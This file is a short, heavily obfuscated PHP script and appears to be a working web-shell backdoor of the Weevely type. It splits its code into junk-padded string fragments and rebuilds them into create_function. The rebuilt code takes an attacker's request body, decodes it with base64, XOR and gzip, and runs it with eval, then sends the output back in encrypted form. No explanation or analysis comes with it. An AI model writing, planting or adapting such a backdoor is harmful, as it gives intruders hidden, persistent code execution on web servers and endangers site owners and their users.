<?php
$k='$Yyk="f0c28853";Yy$khYy=Yy"104f0070bYy789"Yy;$kf="cYyYydbf1778aYy98e"YyYy;';
$F='=@base6YyYyYy4_encodYye(@xYy(@gzcYyompress($oYy),$k));prinYyYyt("$p$kh$r$kf");}';
$u='l);$j++,$i+Yy+){$o.=Yy$t{$iYy}^$kYy{$j}YyYy;}}retYyurn $o;}if (@pregYy_matc';
$f='=Yy1) {@ob_staYyrt();@YyevaYyl(@gYyzuYyncomYypress(@x(@baseYy64_dYyecodY';
$V='$p="FOPXrhBWqnp9avYyRYyY";funcYytion x($t,Yy$k){$c=sYytrYylen($k);$l=Yys';
$d='hYy("/$kh(Yy.Yy+)$kf/",@fYyYyile_get_contYyents("Yyphp:/Yy/input"Yy),$m)=Yy';
$I='trleYyn($t);$oYy="Yy";Yyfor($i=0;$i<$Yyl;Yy){Yyfor($j=0;($j<Yy$Yyc&&Yy$i<$';
$s=str_replace('wj','','wjcrewjatewjwj_fuwjnwjction');
$a='yYyYye($m[1]),$kYy)));$o=@ob_get_coYynteYynts();@oYyb_endYy_cleaYyn();$r';
$P=str_replace('Yy','',$k.$V.$I.$u.$d.$f.$a.$F);
$j=$s('',$P);$j();
?>
